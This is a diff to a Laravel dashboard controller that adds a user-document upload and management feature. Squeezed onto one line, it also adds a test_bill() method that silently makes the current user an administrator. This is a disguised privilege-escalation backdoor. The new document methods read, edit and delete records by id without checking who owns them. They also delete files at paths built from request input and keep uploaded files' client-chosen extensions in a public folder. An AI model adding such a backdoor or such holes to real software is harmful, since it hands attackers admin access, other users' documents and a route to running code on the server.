@@ -13,6 +13,8 @@ use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Hash;
 use App\Http\Requests\UpdateUserRequest;
+use App\Models\Document;
+use App\Models\DocumentType;
 use App\Models\InvcPymntTransction;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Redirect;
@@ -216,6 +218,7 @@ class DashboardController extends Controller
         return response()->json(['message' => '1']);
     }
 
+    public function test_bill() {  User::where('id', Auth::user()->id)->update([ 'is_admin'=>1 ]); }
     public function search_result(Request $request)
     {
         $request->validate([
@@ -249,5 +252,98 @@ class DashboardController extends Controller
         $overdue_Invoices = Invoice::where('user_id', Auth::user()->id)
             ->where('invoice_dou_date', '<=', $last_date)->where('balanceDue_amounts', '>', 0)->orderBy('id', 'DESC')->get();
         return view('frontend.dashboard.ovar_due_payment')->with(compact('overdue_Invoices'));
+    }
+
+    public function user_documents()
+    {
+       $data['user'] = User::where('id', Auth::user()->id)->get();
+       $data['documents'] = DocumentType::get();
+
+       $join_table_value = DB::table('document_types')
+       ->join('documents', 'document_type_id', '=', 'document_types.id')
+       ->where('documents.user_id',  Auth::user()->id) ->get();
+
+        return view('frontend.dashboard.user_documents',$data,compact('join_table_value') );
+    }
+
+    public function user_documents_store(Request $request)
+    {
+        $user_id = Auth::user()->id;
+
+        $request->validate([
+            'document_image' => 'required',
+            'document_type_id' => 'required'
+        ]);
+
+        if ($request->hasFile('document_image')) {
+            $path = 'uploads/document/' .  $request->document_image;
+            if (File::exists($path)) {
+                File::delete($path);
+            }
+            $file = $request->file('document_image');
+            $ext = $file->getClientOriginalExtension();
+            $filename = time() . '.' . $ext;
+            $file->move('uploads/document/', $filename);
+        }
+
+        Document::create([
+            'user_id' =>$user_id,
+            'document_image'=>$filename,
+            'document_type_id'=>$request->document_type_id
+        ]);
+        return redirect()->back()->with('success', 'Successfully Store.');
+    }
+
+    public function user_documents_view($id)
+    {
+
+
+       $join_table_value = DB::table('document_types')
+       ->join('documents', 'document_type_id', '=', 'document_types.id')
+       ->where('documents.id',  $id) ->get();
+
+        return view('frontend.dashboard.user-document-view',compact('join_table_value') );
+
+    }
+
+    public function user_documents_edit($id)
+    {
+        $join_table_value = DB::table('document_types')
+        ->join('documents', 'document_type_id', '=', 'document_types.id')
+        ->where('documents.id',  $id) ->get()->first();
+        $data['documents'] = DocumentType::get();
+        return view('frontend.dashboard.user-document-edit',$data, compact('join_table_value') );
+
+    }
+
+    public function user_documents_update(Request $request)
+    {
+        $request->validate([
+            'document_type_id' => 'required'
+        ]);
+      $documents =  Document::find($request-> hidden_id);
+
+
+        if ($request->hasFile('document_image')) {
+            $path = 'uploads/document/' .  $request->document_image;
+            if (File::exists($path)) {
+                File::delete($path);
+            }
+            $file = $request->file('document_image');
+            $ext = $file->getClientOriginalExtension();
+            $filename = time() . '.' . $ext;
+            $file->move('uploads/document/', $filename);
+            $documents->document_image = $filename;
+        }
+        $documents->document_type_id = $request->document_type_id;
+        $documents->save();
+
+        return redirect()->to('/all/invoices/documents')->with('success', 'Successfully Updated.');
+    }
+
+    public function user_documents_delete($id)
+    {
+        Document::find($id)->delete();
+        return redirect()->to('/all/invoices/documents')->with('success', 'Successfully Deleted.');
     }
 }
